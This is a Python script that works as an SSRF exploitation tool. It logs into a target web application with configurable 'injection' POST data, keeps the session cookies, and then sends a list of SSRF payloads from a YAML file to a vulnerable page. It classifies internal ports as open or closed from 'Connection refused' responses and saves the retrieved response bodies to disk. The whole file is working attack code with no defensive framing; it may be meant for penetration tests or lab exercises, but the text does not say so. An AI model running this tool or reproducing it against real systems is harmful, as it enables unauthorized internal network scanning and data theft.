import argparse
import requests
import yaml
import os
import bs4
import logging

def set_logger(log_level:str):
    
    if str(log_level).lower() == "info":
        logging.basicConfig(level=logging.INFO)
        return

    if str(log_level).lower() == "debug":
        logging.basicConfig(level=logging.DEBUG)
        return

    if str(log_level).lower() == "warning" or str(log_level) == "warn":
        logging.basicConfig(level=logging.WARNING)
        return

    logging.basicConfig(level=logging.INFO)
    return

def login(remote_login_page:str, injection_data, session_cookie_names):

    # Login to the remote webpage
    # ====================================================
    logging.debug("ATTEMPTING LOGIN AT " + remote_login_page + " WITH LOGIN POST - " + str(injection_data))
    response:requests.Response = requests.post(url=remote_login_page, 
                                                allow_redirects=True,
                                                data=injection_data)
    # ====================================================

    # Extract all expected session cookies
    # ====================================================
    session_cookies = {}
    for request in response.history:
        for name in session_cookie_names:
            session_cookies[name] = request.cookies.get(name)
    logging.debug("COOKIES FOUND: " + str(session_cookies))
    # ====================================================
    
    return session_cookies

def main():

    # Setup an arg parser to process incoming domain
    # ==============================================
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config_file",  help="Configuration file for ssrf exploitation", type=str, dest="config_file")
    args = parser.parse_args()
    # ===============================================
    
    # Ensure the domain is provided to the application
    # ================================================
    if args.config_file is None or args.config_file == "":
        print("Configuration file must be provided")
        print("EXITING")
        exit(-1)
    # ================================================

    # Get configuration from file
    # ===========================
    with (open(args.config_file) as file_stream):
        try:
            yaml_config = yaml.safe_load(file_stream)
        except yaml.YAMLError as e:
            print(e)
            exit(-1)
    # ===========================

    # Set log level
    # =============
    set_logger(log_level=yaml_config['log_level'])
    logging.debug("Config file found: " + args.config_file)
    # =============

    # Construct the url for the remote site and login page
    # ====================================================
    remote_site_url:str = "http://" + yaml_config['remote_host'] + ":" + yaml_config['remote_port']
    logging.debug("REMOTE URL DEFINED: " + remote_site_url)
    
    remote_login_page:str = remote_site_url + yaml_config['login_endpoint']
    logging.debug("REMOTE LOGIN PAGE DEFINED: " + remote_login_page)
    # ====================================================

    # Login to the webpage
    # ====================
    session_cookies = login(remote_login_page=remote_login_page, 
                            injection_data=yaml_config['post_login_injection_data'], 
                            session_cookie_names=yaml_config['session_cookie_names'])
    # ====================

    # Establish the defined vulnerable webpage
    # ========================================
    vuln_webpage:str = remote_site_url + yaml_config['vuln_webpage']
    logging.debug("VULNERABLE WEBPAGE DEFINED: " + vuln_webpage)
    # ========================================

    # Output 
    # ======
    print("\nSSRF INJECTION FOR " + remote_site_url)
    print("==========================================")
    print("VULNERABLE WEBPAGE: " + str(vuln_webpage))
    print("SESSION COOKIES   : " + str(session_cookies))
    print("\n")
    # ======
    
    for i, ssrf_injection in enumerate(yaml_config['ssrf_injections']):

        id:int = i + 1
        name:str = ssrf_injection['name']
        
        hostname:str = str(ssrf_injection['hostname'])
        port:int     = int(ssrf_injection['port'])

        # Ensure an output directory is made
        # ==================================
        if os.path.exists("output") == False:
            os.mkdir("output")
        # ==================================

        injection_url:str = str(ssrf_injection['injection']).replace("{hostname}", hostname).replace("{port}", str(port))

        # Construct exploit url payload for exploitation
        # ==============================================
        ssrf_url:str = vuln_webpage + "?" + injection_url
        logging.debug("PAYLOAD GENERATED: " + ssrf_url)
        # ==============================================
        
        try:
            response:requests.Response = requests.get(url=ssrf_url, cookies=session_cookies, timeout=5)
            
            print(f"\tSSRF INJECTION #{id} ({name}) - ", end="")
            if port > 0 and port < 65536:
                if response.text.__contains__("Connection refused"):
                    print("CLOSED")
                else:
                    print("OPEN")
                    with (open("output/" + ssrf_injection['name'], "w+")) as ssrf_file_out:
                        ssrf_file_out.write(response.text)
            else:
                print("PORT OUT OF RANGE (1 - 65535)")

            print(f"\t================================")
            print(f"\tPAYLOAD: {ssrf_url}")
            print(f"\tCOOKIES: {str(session_cookies)}\n\n")
        except:
            print(f"\tSSRF INJECTION #{id} ({name}) - ", end="")
            print("REQUEST TIMED OUT (PORT ASSUMED TO BE CLOSED)\n\n")    
            session_cookies = login(remote_login_page=remote_login_page, 
                                        injection_data=yaml_config['post_login_injection_data'], 
                                        session_cookie_names=yaml_config['session_cookie_names'])
            continue


if __name__ == "__main__":
    main()